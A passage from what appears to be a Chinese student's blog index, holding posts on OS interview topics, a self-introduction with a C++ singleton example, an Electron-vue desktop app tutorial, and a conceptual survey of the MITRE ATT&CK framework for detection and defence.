进程间通信的方式通常分为管道、系统IPC、套接字三种，其中管道有无名管道、命名管道，系统IPC有消息队列、信号、共享内存 无名管道的本质是在内核缓冲区的环形队列，每次读取数据后缓冲区都会移动，并且无名管道只能在有亲缘关系的进程间使用 命名管道则以文件的形式存在，由于有一个路径名，使用没有亲缘关系的进程间也可以使用命名管道 消息队列是存放在内核中的消息链表，具有特定的格式，支持多种数据类型，且允许多个进程进行读写 信号是软件层次上对中断机制的一种模拟，是一种异步通信方式，并且信号可以在用户空间进程和内核之间直接交互 共享内存顾名思义就是两个进行对同一块内存进行读写，是最快的IPC形式，但不适合大量的数据传输 Socket是对TCP/IP协议族的封装，不仅可以用于本机上的进程间通信，更多的被用于网络通信中 进程线程管理进程的互斥与同步在操作系统中，进程是占有资源的最小单位，对于那种只能同时被一个进程持有的资源我们称为临界资源，对于临界资源的访问，必须是互斥的。（对于；临界资源的访问过程分为：进入区、临界区、退出区、剩余区） 而进程之间访问临界资源时可以构成同步与互斥两种关系，同步即两个进程的资源访问必须是先后关系，比如经典的生产者消费者问题，读者写着问题。而互斥则是两种在进行资源抢到，比如购票问题。 通常在软件层面可以使用替换算法来实现，即每个进程持有一个标志，每次当使用资源时则将自己的标志与资源的标志互换，如果在互换的过程中发现自己获得的标志是正在使用的状态，则在此循环等待。这种方法的缺点在于每个进程都需要进行循环等待，比较低效。所以一般是通过硬件层面的信号量即PV操作来实现进程的临界资源管理。 死锁的解决方法涉及公司：阿里云实习生 死锁的产生是在这样一种环境中：比如我们有两个进程AB，他们都需要资源1和资源2，当进程A持有资源1，进线程B持有资源2的时候，他们都需要对方手上的进程，而一般操作系统又不允许抢占，这个时候就发生了死锁。 从这个例子中其实可以总结出死锁的几个必要条件： 1.一个资源只能被一个进程所占有，不能共享 2.一个线程请求资源失败时，它会等待而不是释放 3.一个线程在释放资源之前其他进程不能抢夺资源 4.循环等待 从死锁产生的原因未明可以设计一些方法去避免死锁的发生 1.静态分配资源，一开始就把一个进程所需的全部资源都分配给它，但这样会降低资源的使用效率 2.允许抢占，需要设置进程的不同优先级，高优先级的进程可以抢占低优先级的进程的资源 3.把资源进行编号，申请资源必须按照资源的编号顺序来申请 如果死锁已经发生了，就需要去解开死锁，其本质思想就是分配资源打破循环等待 1.可以运行抢占，从一个或多个进程中抢出资源来给其他进程 2.也可以终止一些进程，来达到释放资源的目的 进程调度算法 先来先服务调度算法 对长作业比较有利，但对短作业不利 时间片轮转调度法 每个进程只能运行一个时间片 时间片的大小对系统性能的影响很大，时间片过大就和先来先服务算法一样，时间片过小会导致进行切换开销大 短作业优先调度算法 对长作业不利，不能保证紧迫性作业（进程）被及时处理 最短剩余时间优先 允许抢占，总是选择预期剩余时间最短的进程 高响应比优先调度算法 R=(w+s)/s （R为响应比，w为等待处理的时间，s为预计的服务时间），选择R最大的进行执行 优先级调度算法 进程优先级可以分为静态优先级和动态优先级 多级反馈队列调度算法 分为多个队列，每个队列中按时间片轮转调度算法来进行进程调度，每一级的队列时间片大小也不一样，如果进行在第一个队列的时间片内没有完成，就会进入第二个队列，以此类推，只有当第一个队列为空才执行第二个队列的进行 短作业有限且长作业不会太长时间不被处理 磁盘调度算法 先来先服务算法（FCFS） 根据进程请求访问磁盘的先后次序进行调度 优点是公平、简单 缺点是吞吐量低，寻道时间长 最短寻道时间优先算法（SSTF） 访问与当前磁头所在的磁道距离最近的磁道 优点是可以得到比较好的吞吐量 缺点是对内外边缘磁道的请求将会被无限延迟 扫描算法（SCAN）电梯调度算法 优先考虑磁头当前的移动方向，再考虑欲访问的磁道与当前磁道的距离 优点是避免了饥饿现象的出现 缺点是两侧磁道被访问的频率仍低于中间磁道 循环扫描算法（CSCAN） 在SCAN算法的基础上，磁头只单向移动，当磁头移到最外的被访问磁道时，磁头立即返回到最里的欲访磁道 优点是访问请求均匀分布 页面调度算法 先进先出调度算法（FIFO，First In First Out） 最近最少使用算法(LFU, Least Frequently Used) 最近最久未使用算法（LRU，Least Recently Used） 时钟置换算法——为每一页设置访问位和修改位，将内存中所有页面通过连接指针接成循环队列，当页面被访问时访问位置1，被修改则修改位置1，每次淘汰时，从指针当前位置开始循环遍历，第一次寻找访问位和修改位都为0的页面，如果没有则将扫描过的节点访问位为1的置为0，找到第一个访问位为0的将其淘汰。这个算法的原则就的在LRU的基础上偏向于淘汰未被修改的页面。 最佳置换算法——理想算法，找一个未来最长时间才会被访问的页面进行淘汰。","categories":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/categories/面经/"}],"tags":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"},{"name":"操作系统","slug":"操作系统","permalink":"https://liuyi12138.github.io/tags/操作系统/"}]},{"title":"个人经历整理","slug":"个人经历整理","date":"2020-03-31T15:44:16.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2020/03/31/个人经历整理/","link":"","permalink":"https://liuyi12138.github.io/2020/03/31/个人经历整理/","excerpt":"昨天第一次投出了简历，目标腾讯，可能最近就要开始面试了，所以对个人的项目经历及获奖经历进行一个整理","text":"昨天第一次投出了简历，目标腾讯，可能最近就要开始面试了，所以对个人的项目经历及获奖经历进行一个整理 总体结构深信服安全邮箱APP开发项目简介一个与深信服公司合作的开发项目，我们这边负责整个邮箱APP的开发，深信服公司负责给APP加上一层安全系统。我主要负责的是底层开发，用的是C++，但其实那时候是第一次接触面向对象语言，自己比较菜，所以做的是边缘一点的模块，最后在语言方面其实并没有学到多少。在这个项目里面更多的是学到了企业级项目的管理与沟通，以及接触到了代码规范，团队开发中的代码管理，接触到了一些简单的设计模式，测试驱动开发，以及了解到了当时看到学长们在做的一些并发程序设计。 总而言之在这个项目里，我自己coding能力并没有很显著的提升，但自己这种稍微大一点的工程有了更强的把握能力，在这个项目里学到的这些在我之后领导小组做网站开发的时候都有用到。 涉及的知识点 项目管理与沟通 每日站会、日报周报、996 架构&gt;开发、前后端沟通：API文档(引申到自己领导小组进行网站开发) 代码规范 函数/类名驼峰式命名，变量下划线命名 局部变量、私有变量加前缀等等 代码管理(Git) 深信服自己搭建gitlab/网安项目组用svn 静态审查 设计模式 测试驱动开发(TDD) 并发程序设计 启亦伏安表APP开发项目简介这个项目能说的就不多了，这是和武汉启亦电子有限公司合作的一个软硬结合的项目，目的是做一个能在他们专用的pad上运行三相电流伏安表，由于我在这个项目是临时抽调，待的时间不长，其中还有一个月出国交流了。在这个项目组的时间里主要就是Android入门，主要工作就做了一个Word报表的生成，这个就比较有意思了，这是我第一次以一个程序员的角度去看待我们常用的Word这个工具，当时其实还挺惊讶，原来word文档的组织结构跟一个网页是相似的。 涉及的知识点 Android开发(现在不会了) Java操作Word 网络安全系统构建项目简介从大三上到现在我就一直都在一个做网络安全的项目组，这个项目是一个研究型的项目，他是一个国家级项目的子课题，我们主要是要构建一套流量的检测与防御系统，还有其他子课题在研究如何去攻击，两边互为矛盾，互相砥砺。我在这个项目中主要做的是逆向工程，比较底层，平时主要接触的是汇编和C，但其实在这个项目组基本就没怎么写过代码，主要以调研与分析为主。在这个项目组里面有意思的工作也不太多，emmm，可能有意思一点的就在于一开始学PE的时候做了一个新人任务，如何用最小的空间去完成一个helloworld程序，当时主要用到方法是裁剪资源表以及利用Dos头里的空间等，以及还考虑过去做字节压缩，但最后没写出来。然后平时的工作有时还会涉及到部分计算机网络的知识。 涉及的知识点 逆向工程 PE文件 一些骚操作(HelloWorld裁剪) 计算机网络 华中赛数模——库存补单及销量预测 时间序列分解 求是杯——鸭梨管家心理压力检测仪 项目原理 网站搭建 express+vue 跨域问题 自我介绍初稿面试官你好，我是来自华中科技大学Dian团队的一名17级本科生，我叫刘羿，目前就读于电子信息与通信工程学院，基于项目的信息类专业教育实验班，我的意向岗位是后台开发。在这里我就先简单介绍一下我在大学三年的时间里的一些项目经历以及获奖经历，以便面试官对我有一个初步的了解。 我在大一下参与了与深信服公司合作的安全邮箱APP的开发，在这个项目组我们团队这边负责整个邮箱APP的开发，深信服公司负责给APP加上一层安全系统。在这项目中我主要负责的是底层开发，用的是C++，但其实那时候是第一次接触面向对象语言，自己比较菜，所以做的是边缘一点的模块，最后在语言方面其实并没有学到多少。在这个项目里面更多的是学到了企业级项目的管理与沟通，以及接触到了代码规范，团队开发中的代码管理，接触到了一些简单的设计模式，测试驱动开发，以及了解到了当时看到学长们在做的一些并发程序设计。 总而言之在这个项目里，我自己coding能力并没有很显著的提升，但自己这种稍微大一点的工程有了更强的把握能力，在这个项目里学到的这些在我之后领导小组做网站开发的时候都有用到。 这个是我大一下到大二上做的一个项目，在大二下就没有做项目了，主要是参加了几个比赛，这个我待会再讲。大三上的时候参与了启亦伏安表APP开发，这个项目能说的其实并不多，这是和武汉启亦电子有限公司合作的一个软硬结合的项目，目的是做一个能在他们专用的pad上运行三相电流伏安表，由于我在这个项目是临时抽调，待的时间不长，其中还有一个月出国交流了。在这个项目组的时间里主要就是Android入门，主要工作就做了一个Word报表的生成，这个就还比较有意思，这是我第一次以一个程序员的角度去看待我们常用的Word这个工具，当时其实还挺惊讶，原来word文档的组织结构跟一个网页是相似的。 从大三上到现在我就一直都在一个做网络安全的项目组，这个项目是一个研究型的项目，他是一个国家级项目的子课题，我们主要是要构建一套流量的检测与防御系统，还有其他子课题在研究如何去攻击，两边互为矛盾，互相砥砺。我在这个项目中主要做的是逆向工程，比较底层，平时主要接触的是汇编和C，但其实在这个项目组基本就没怎么写过代码，主要以调研与分析为主。在这个项目组里面有意思的工作也不太多，emmm，可能有意思一点的就在于一开始学PE的时候做了一个新人任务，如何用最小的空间去完成一个helloworld程序，当时主要用到方法是裁剪资源表以及利用Dos头里的空间等，以及还考虑过去做字节压缩，但最后没写出来。然后平时的工作有时还会涉及到部分计算机网络的知识。 接下来我说一下获奖的经历吧，主要就是两个奖项，一个是华中赛的数模，做的是一个库存补单及销量预测的一个模型，一开始拿到这个这个题目就考虑用机器学习去做，但最后效果不是很好，毕竟我们也不是专业做AI的，后来是做了一个基于统计的模型，用的时间序列的分解，把一个销量的模型按季节性、商业活动、新品上市等方面去做拆分，最后给商家设计了一套进货的策略模型，在这个比赛中是拿了一等奖。 还有一个是求是杯，这是一个创新创业的比赛，我们的项目是一个实验室的课题，做的是一款心理压力检测仪叫鸭梨管家，他的原理主要是人在压力大的时候唾液里的一种酶会增多，然后有一种检测试纸可以检测浓度，当时我是和一个学长一起做对试纸的图像分析，我负责软件方面，主要做了一些图像识别的工作，后来还加上了CNN去预测心理压力纠正数据误差，但其实这个效果也不好去评判。最后这个项目拿了一个三等奖。 除了这些项目和参赛的经历之外，我也做了不少学生工作，担任过电信学院的科协主席，也是在这个时候带着学弟学妹去做过一些网站，比如学院的选课网站啊，以及学生会的招新网站等，这个在前面也提到过，用的主要是nodejs的express框架，比较基础，数据库都用的mongodb，对其数据库只是了解，并不太熟。 我自己在平时也会做一些也会做一些便利工作与生活的一些小玩意，比如学Android的时候写过一个火锅计时器，在整博客的时候写过一个自动同步有道云笔记到Hexo博客的PC端程序，还有什么自动评教脚本这些等等，但对于这些技术其实也没有太深刻的理解，做的时候都是秉承着能用就行的原则，技术为需求服务。 这大概就是我本科阶段的一些经历，整体说起来其实做得很杂，什么都接触过，但感觉什么都不精通，所以可能很多细节原理部分自己都是一知半解的，但个人感觉在接受新知识的方面应该是比一般同学要强一点，毕竟啥都接触过一点，可能就这么点优势。我的自我介绍大概就这么多，面试官有没有什么问题我们再来探讨。 详细知识点整理git与svn区别 git是分布式的，svn是集中式的 git能具体定位到元数据，而svn则是按文件进行管理 svn的分支就只是另一个文件夹，git的才是真分支 git的主分支和其他分支没有本质差别，svn的其他分支都是基于某一个主分支进行管理的 测试驱动开发(TDD) 先写单元测试再开始写代码 注意输入参数合法性校验以及边界值检测 g_test框架 Word文档结构 XML 跨域问题及解决 问题产生缘由：浏览器的同源策略 同源策略缘由：保障浏览器安全 CSRF攻击（Cross-site request forgery）跨站请求伪造 解决方案：CORS（跨资源共享）-&gt; 修改Header信息 知识点整理集合Linux&amp;编译原理 操作系统 数据库 计算机网络 编程语言 面经List阿里云实习生 腾讯实习生 深入交流的point并发程序设计案例记忆中比较深刻的一次开发经历是我在深信服组做底层开发的时候，当时我写的是配置模块，就是一些设置项，这些是存储在本地的，因为数据量不大，所以当时是用的文件读写的方式进行存储的。一般的配置项其实对并发要求并不高，但当时在配置模块中还存储了自动回复的消息，每次自动回复的时候都会进行访问，所以有一定的并发性。 当时第一次写完程序的时候，高并发测试一直过不去，我自己就先自查嘛，尝试计了一下时，发现大部分的时间花在了文件读写上，在数据处理上花的时间不太多，所以当时就去询问项目经理怎么办，我们的项目经理是深信服公司过来的带着我们做的一个架构师，他当时告诉我说可以用缓存来解决高并发的问题，让我自己去网上查一下。然后我就自己尝试着写了一个缓存的模型，大概就是每次启动APP的时候我就把自动回复的信息读取到内存中，每次写入的时候就更新缓存再异步写入到文件里。 对于这个缓存模型一开始我是用单例模式来实现的，一开始不熟悉单例模式自己一边百度一边写出了一个懒汉模式，但在测试过程数据时不时会出现一些问题，查了很久才发现是因为我实现的这个类线程不安全，可能会造成有多个对象被创建，最后是用双重锁检查机制来解决的这个问题，也就是在加锁之前后各检查一次对象是否存在。 整个过程其实挺曲折的，我在写这个的时候也让项目经理废了不少心，毕竟当时才大一，很多东西不懂，我记得我当时每次很快就写好了代码然后兴冲冲地提交，每次审代码的时候又会被驳回并被教育一次，在这个过程中虽然做的不是很复杂，最后看来也就是一个缓存机制加一个锁的机制，但整个过程下来就理解了为什么要这么做，让我很印象深刻。 Q：为什么要用双重锁机制进行两次检验呢，一次不可以吗？ A：理论上来说一次检验也是可以的，但如果没有第一次的instance的检测，那么在后续获取单例的时候，如果是多个线程同时访问的话就会在synchronized排队，这个时候实际上是不需要同步的，所以才会引入双重锁机制。 123456789101112131415161718192021class Singleton &#123; private: static Singleton* m_instance; Singleton()&#123;&#125; public: static Singleton* getInstance(); &#125;; Singleton* Singleton::getInstance() &#123; if(NULL == m_instance) &#123; Lock(); if(NULL == m_instance) &#123; m_instance = new Singleton; &#125; UnLock(); &#125; return m_instance; &#125; Q：常见的单例模式有哪些实现方法 A：主要有以下四种： 饿汉式(在类加载的时候完成对象加载，线程安全) 懒汉式(第一次使用的时候完成对象加载，线程不安全，可以加入单重/双重锁检查机制) 静态内部类(线程安全) 枚举(线程安全) 一台主机不能设置两个网关在网安组记忆比较深刻的是我们在做恶意软件复现的时候搭建了一个攻防平台，要求是两个内网中间用一个交换机连接。当时交换机有其他小组在用，所以我们就用了一台双网卡的机器来当做交换机，配置防火墙和抓包也方便。 但遇到了一个问题是内外网ping不同，于是就开始排查，找了很久发现没什么问题，觉得每一个网段都没问题，应该是在充当交换机的机器这卡住了。后来看到ping的输出是目标主机不可达，这就很奇怪，因为一般网络不通会请求超时，所以我们判断应该是网关有问题，可能是防火墙设置的问题，没有把数据包转发出去。 后来发现是这台机器上的两个网卡都设置了网关，同一台机器或者路由器上的两个网口是可以互相通信的，所以内网网口是不需要设置网关的，只需要对外的网口设置网关即可，如果两个网口都设置了网关，路由器就不知道数据包往哪发了，所以就返回了目标主机不可达。 从这次经历中我们也明白了理论知识对于实践的重要性。","categories":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/categories/面经/"}],"tags":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"}]},{"title":"Electron-vue桌面程序开发实战","slug":"Electron-vue桌面程序开发实战","date":"2020-03-09T10:36:16.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2020/03/09/Electron-vue桌面程序开发实战/","link":"","permalink":"https://liuyi12138.github.io/2020/03/09/Electron-vue桌面程序开发实战/","excerpt":"很早之前就想把博客迁移脚本(YoudaoToHexo)给做成一个应用程序，由于脚本是python写的，之前调研过pyqt、vxpython等，感觉做的都比较丑，正好看到了PicGo的开发使用的是Electron-vue，比较符合我的技术栈，所以就进行了一次尝试","text":"很早之前就想把博客迁移脚本(YoudaoToHexo)给做成一个应用程序，由于脚本是python写的，之前调研过pyqt、vxpython等，感觉做的都比较丑，正好看到了PicGo的开发使用的是Electron-vue，比较符合我的技术栈，所以就进行了一次尝试 Electron-vue简介 Electron-vue这个东西就比较神奇了，其作用就是利用vue来开发桌面端程序，并且可以适配主流的三种平台。 这就很类似于之前见过的Hbuilder(有兴趣的同学可以了解一下，也是用web开发的方式快速开发应用，可以直接适配Web，Android，ios，微信小程序等平台) 这两者其实本质上都是给web套个壳，虽然可能不如原生流畅，但开发周期短，感觉挺适合个人开发者自己玩 Electron-vue的好处就在于他可以调用操作系统的API，Hbuilder貌似是不能的，但坏处就在于要把node、vue等一套打包，所以做出来的程序会比较大 开发流程 目前BlogGo-1.0.0已经开发完成，在此简单地记录了一下开发流程 新建项目vue init simulatedgreg/electron-vue Exename 组件介绍 在进行electron-vue开发的时候，为了实现需要的功能，找了不少小巧方便，即插即用的组件，为开发提供了极大的便利 element-ui element-ui为vue开发常见的组件模组 /src/renderer/main.js添加如下代码 123import ElementUI from &apos;element-ui&apos;import &apos;element-ui/lib/theme-chalk/index.css&apos;Vue.use(ElementUI) /.electron-vue/webpack.renderer.config.js第22行添加element-ui模块let whiteListedModules = [&#39;vue&#39;,&#39;element-ui&#39;] 删除package-lock.json,在package.json中修改,重新npm install 123456//在此就把接下来用上的packets都写了&quot;dependencies&quot;:&#123; &quot;element-ui&quot;: &quot;^2.13.0&quot;, &quot;child_process&quot;: &quot;^1.0.2&quot;, &quot;electron-store&quot;: &quot;^5.1.1&quot;,&#125; electron-store electron-store用于信息存储 在vue文件中直接引用即可 1234const Store = require(&apos;electron-store&apos;)const store = new Store()let dataSet = store.set(&apos;data&apos;)let dataGet = store.get(&apos;data&apos;) electron-store存储的信息在C:\\Users\\User\\AppData\\Roaming\\Exename\\config.json中，也是因此electron-store不适合存储大量数据，大量数据可采用文件或者数据库的方式存储 child_process electron好就好在可以调用操作系统的API，当有调用cmd的需求时可以使用child_process 使用方式与electron-store相似，直接在vue文件中使用即可12345678910111213141516const exec = require(&apos;child_process&apos;).exec//cmdStr为需要执行的语句，path为执行目录let workerProcess = exec(cmdStr, &#123;cwd: path&#125;)//有警告或者错误输出时的回调函数workerProcess.stderr.on(&apos;data&apos;, function (error) &#123; console.log(error)&#125;)//正常输出时的回调函数workerProcess.stdout.on(&apos;data&apos;, function (data) &#123; console.log(data)&#125;)//程序执行结束时的回调函数workerProcess.on(&apos;close&apos;, function (code) &#123; console.log(code)&#125;) 开发踩坑由于本来就不太会vue，js写的也一般，所以在整个开发过程中还是踩了不少的坑，但最终还是把产品做出来了，很多模块之后可以复用，当然也可以给其他朋友们一点帮助 request请求乱码 在BlogGo的开发中我需要向有道云发起请求，使用的是nodejs的request模块如下 1234567891011var request = require(&apos;request&apos;) request(&#123; url: url, method: &apos;POST&apos;, json: true, headers: HEADERS, form: data, gzip: true &#125;, function (error, response, body) &#123; console.log(body) &#125;) 遇到乱码主要是受到的responce是数据包，没有解压导致的，需要在request的参数中加入gzip JS异步调用 JS是我目前见过的最奇葩的一门语言了，因为我一般都是在做Web时使用js，这也就导致遇到的大部分函数调用都是异步的，之前一直是采用回调函数的方法来解决，也就是上面request请求所使用的方法，但如果逻辑比较复杂，回调函数就会写得及其恐怖，这次算是彻底解决了这个问题 主要用到的有async，await，Promise，下面将一一个例子来讲解用法，但别指望我能把这些东西讲清楚，能用就行，想具体了解自行百度123456789101112131415161718192021async myRequest() &#123; return new Promise(function (resolve, reject) &#123; var request = require(&apos;request&apos;) request(&#123; url: url, method: &apos;POST&apos;, json: true, headers: HEADERS, form: data, gzip: true &#125;, function (error, response, body) &#123; if(!error &amp;&amp; response.statusCode === 200) resolve(body) else reject(error) &#125;) &#125;&#125;//main.jslet body = await myRequest() 自定义标题栏 Electron-vue自带的标题栏其实还行，但一定要绑定工具栏就巨难受，为了不显示工具栏，终于走上了自定义标题栏的不归路…… 其实主要想法也很简单，就是在主页面上单独放置一个MyTitle.vue页面，这需要在APP.vue中进行修改 1234567891011121314151617181920212223242526//修改后的APP.vue&lt;template&gt; &lt;div id=&quot;app&quot;&gt; &lt;Mytitle /&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import Mytitle from &apos;@/components/MyTitle&apos; export default &#123; name: &apos;BlogGo&apos;, components: &#123; Mytitle &#125; &#125;&lt;/script&gt;&lt;style&gt;html,body,div &#123; margin: 0; padding: 0;&#125;&lt;/style&gt; 而对于MyTitle.vue，自然是想怎么设置就怎么设置，但需要注意两个点 一个是去除顶部栏无法拖动的问题，这个上百度其实大家都讲得很清楚，基本都是给顶部栏加上一个-webkit-app-region: drag的style就可以，但如果在顶部栏上有按键的话，需要给按钮设置不可拖动style=&quot;-webkit-app-region: no-drag&quot;不然无法触发点击事件 另一个是点击事件的传递问题，由于窗口是由main管理的，页面是由renderer管理，所以需要对windows操作需要联系到main，网上的大部分方法都是使用ipcMain与main的index.js进行通信，但我确实是没跑通，最终采用的是在PicGo中抄过来的方法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566//MyTitle.vue&lt;template&gt; &lt;div id=&quot;mytitle&quot;&gt; &lt;el-row&gt; &lt;el-col :span=&quot;8&quot; :offset=&quot;8&quot;&gt; &lt;div class=&quot;view-title&quot;&gt; &#123;&#123;name&#125;&#125; &lt;/div&gt; &lt;/el-col&gt; &lt;el-col :span=&quot;8&quot;&gt; &lt;div class=&quot;titlebtn&quot;&gt; &lt;el-button type=&quot;text&quot; size=&quot;medium&quot; icon=&quot;el-icon-minus&quot; circle @click=&quot;winmin&quot; style=&quot;-webkit-app-region: no-drag&quot;&gt;&lt;/el-button&gt; &lt;el-button type=&quot;text&quot; size=&quot;medium&quot; icon=&quot;el-icon-full-screen&quot; circle @click=&quot;winmax&quot; style=&quot;-webkit-app-region: no-drag&quot;&gt;&lt;/el-button&gt; &lt;el-button type=&quot;text&quot; size=&quot;medium&quot; icon=&quot;el-icon-close&quot; circle @click=&quot;winclose&quot; style=&quot;-webkit-app-region: no-drag&quot;&gt;&lt;/el-button&gt; &lt;/div&gt; &lt;/el-col&gt; &lt;/el-row&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; const &#123;remote&#125; = require(&apos;electron&apos;) export default &#123; data () &#123; return &#123; name: &apos;BlogGo-1.0.0&apos; &#125; &#125;, methods: &#123; winmin () &#123; const window = remote.BrowserWindow.getFocusedWindow() window.minimize() &#125;, winmax () &#123; const window = remote.BrowserWindow.getFocusedWindow() if (window.isMaximized()) &#123; window.restore() &#125; else &#123; window.maximize() &#125; &#125;, winclose () &#123; const window = remote.BrowserWindow.getFocusedWindow() window.close() &#125; &#125; &#125;&lt;/script&gt; &lt;style&gt;#mytitle &#123; position: left; width: 100%; height: 30px; -webkit-app-region: drag;&#125;.titlebtn&#123; width: 100%; height: 30px; text-align: right;&#125;.view-title&#123; text-align: center;&#125;&lt;/style&gt; 最终实现效果 BlogGo 打包及发布 打包及发布有两种形式 electron-packager用于简单地打包 electron-builder用于完整的安装程序、自动更新的支持等，也就是所谓的CI构建 使用electron-packager打包只需要npm run build一条命令然后等待就可以了，十分方便 具体的打包与构建可以参考官方文档，其实也没写的多具体,一两句话… 还可以通过PicGo开发笔记来了解更多，一般比较需要的是一些基本的修改比如应用名称啊，版本号啊，图标啊等等，更多的可自行参考上述的参考资料 开发感想 有一说一花了四天时间使用一项新技术开发出一个作品是一件挺值得让人骄傲的事情，先高兴一下 主要是作为一名业余选手，无论是Web、APP还是PC桌面程序的开发其实都是为了使自己的生活更加便捷，所以在整个开发过程中基本都是需要什么技术就去找，找到了就用上，并不关心背后的技术原理以及是否有更好的解决方法，有时候连为什么bug通了都不知道，但其实也无所谓，能用就行23333 另一方面就是要开始注意版本管理与发布了，之前一直不懂Github的ReadMe怎么去写，现在也要开始着手去学了，之后估计并不会用上CI吧，毕竟是做给自己用的，不过大家提的issue还是需要尝试去改进 路漫漫其修远兮，继续加油吧","categories":[{"name":"前端","slug":"前端","permalink":"https://liuyi12138.github.io/categories/前端/"}],"tags":[{"name":"轮子","slug":"轮子","permalink":"https://liuyi12138.github.io/tags/轮子/"},{"name":"vue","slug":"vue","permalink":"https://liuyi12138.github.io/tags/vue/"}]},{"title":"Mitre ATT&CK调研","slug":"Mitre ATT&CK调研","date":"2020-02-07T05:53:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2020/02/07/Mitre ATT&CK调研/","link":"","permalink":"https://liuyi12138.github.io/2020/02/07/Mitre ATT&CK调研/","excerpt":"网安组调研内容","text":"网安组调研内容 先验知识Cyber Kill Chain 杀伤链”这个概念源自军事领域，它是一个描述攻击环节的六阶段模型，理论上也可以用来预防此类攻击（即反杀伤链）。 Cyber Kill Chain是由洛克希德-马丁公司提出的网络攻击杀伤链，本质是一种针对性的分阶段攻击。同样，这一理论可以用于网络防护。 ATT&amp;CK ATT&amp;CK是MITRE在2013年推出的模型，用以根据真实的观察数据来描述和分类对抗行为,该框架把攻击者所采用的 TTP (战术Tactics、技术Techniques、过程Procedures) 系统性地组织起来. ATT&amp;CK将已知攻击者行为转换为结构化列表，将这些已知的行为汇总成战术和技术，并通过几个矩阵以及结构化威胁信息表达式（STIX）、指标信息的可信自动化交换（TAXII）来表示。 MITRE ATT＆CK与Kill Chain的对比 ATT&amp;CK模型是在KillChain模型的基础上进行构建的。 目前ATT&amp;CK模型分为三部分，分别是PRE-ATT&amp;CK，ATT&amp;CK for Enterprise和ATT&amp;CK for Mobile。 PRE-ATT&amp;CK覆盖Kill Chain模型的前两个阶段，包含了与攻击者在尝试利用特定目标网络或系统漏洞进行相关操作有关的战术和技术。 ATT&amp;CK for Enterprise覆盖Kill Chain的后五个阶段。 ATT&amp;CK for Mobile包含适用于移动设备的战术和技术。 ATT＆CK与Kill Chain的对比流程图 ATT&amp;CK与Kill Chain的不同之处在于，它并不遵循任何线性顺序，攻击者可以任意切换战术来实现目标。 除了在Kill Chain战术上更加细化之外，ATT＆CK还描述了可以在每个阶段使用的技术，而Kill Chain则没有这些内容。 MITRE ATT＆CK框架详细介绍 MITRE ATT＆CK以矩阵的形式来展现完整的攻击过程。 攻击战术展示在矩阵顶部，每列下面列出了单独的技术。一个攻击序列按照战术，至少包含一个技术，并且通过从左侧（初始访问）向右侧（影响）移动，就构建了一个完整的攻击序列。 攻击者不一定会使用矩阵顶部所示的所有12项战术。相反，攻击者会使用最少数量的战术来实现其目标，因为这可以提高效率并且降低被发现的几率。 MITRE ATT＆CK矩阵 ATT&amp;CK for Enterprise攻击战术 初始访问:从PRE-ATT&amp;CK到ATT&amp;CK的理想过渡点 执行:恶意软件的运行、APT攻击等 持久化:使用注册表Run键、启动文件夹等方法使得恶意软件在靶机上持续存在 提升权限:利用系统漏洞获取到root级访问权 防御规避:骗过防病毒产品或绕过应用白名单等技术 凭据访问:窃取密码来获得访问权限 发现:类似于Cyber Kill Chain中的侦查,较难防御 横向移动:攻击者在利用单个系统漏洞后，通常会尝试在网络内进行横向移动，寻找更高的访问权限，以期达成最终目标 收集:攻击者为了发现和收集实现目标所需的数据而采取的技术 命令与控制:通过命令和控制权来渗透数据、告诉恶意软件下一步执行什么指令 数据渗漏:攻击者获得访问权限后会四处搜寻相关数据，然后开始着手数据渗透 影响:攻击者试图操纵、中断或破坏企业的系统和数据 ATT&amp;CK for Enterprise技术描述在ATT&amp;CK中所有的攻击检测都是基于数据源和策略的特征匹配，我们如果需要检测某个攻击技术，首先需要获取到这项技术所对应的数据。 这些数据就是当攻击者执行某项技术攻击主机或网络后，在主机或网络设备上留下的蛛丝马迹，他们所呈现的形式往往是各种日志，可能是系统或应用内置的日志，也可能是因为安全需要而特意录制的日志数据。 在 MITRE ATT&amp;CK 的每项技术描述中都有对应于该技术的数据源信息，它告诉我们可以从哪些类型的数据中找到攻击技术实施后所留下的痕迹。 并且MITRE ATT&amp;CK还给出了每项技术的程序示例、侦测及缓解措施。 在此以LSASS Driver为例来予以说明 我们所分析过的wannacry正是采用了DLL注入到进程lsass.exe 中的方法来实现执行和持久化这两个步骤。 技术描述 对于每一项技术ATT&amp;CK都会给出一段简单的描述便于使用者去简要理解这项技术。 从技术描述中我们可以了解到对手可能将lsass.exe驱动程序作为目标来获得执行和/或持久性。对手可以实现由连续LSA操作触发的任意代码执行这和我们分析得出的Wannacry使用的技术相符合。 describe 数据源信息 在ATT&amp;CK的数据库中对每一项技术都有自己特有的ID，并且给出了侦测与防御它所需要的数据源。 sourceData 侦测与防御方案 最后ATT&amp;CK也给出了侦测与防御的建议。 Detection&Defence 程序示例 对于每一项技术，ATT&amp;CK还给出了使用过这种技术的攻击示例。 example 而对于每一个攻击示例，也提供了各种信息，可以用来定点防范。 example2 ATT&amp;CK的应用场景至目前为止，ATT&amp;CK 知识库主要被应用在以下四大方向上： 模拟攻击:基于 ATT&amp;CK 进行红蓝攻防演练，进行红蓝军建设。 检测分析:基于具体的技术，有效增强检测能力，用于甲方安全建设。 威胁情报:使用 ATT&amp;CK框架来识别攻击组织，用于安全情报建设。 评估改进:将解决方案映射到 ATT&amp;CK 威胁模型，发现并弥补差距，用于评估安全能力。 模拟攻击此部分重点讨论如何基于ATT&amp;CK框架来制定红蓝对抗方案以提升检测能力。 传统的渗透测试侧重于突出攻击者可能在某个时间段会利用不同类型系统上的哪些漏洞。MITRE的对抗模拟方法不同于这些传统方法。其目标是让红队成员执行基于特定或许多已知攻击者的行为和技术，以测试特定系统或网络的防御效果。 对抗模拟演习由小型的重复性活动组成，这些活动旨在通过系统地将各种新的恶意行为引入环境，来改善和测试网络上的防御能力。 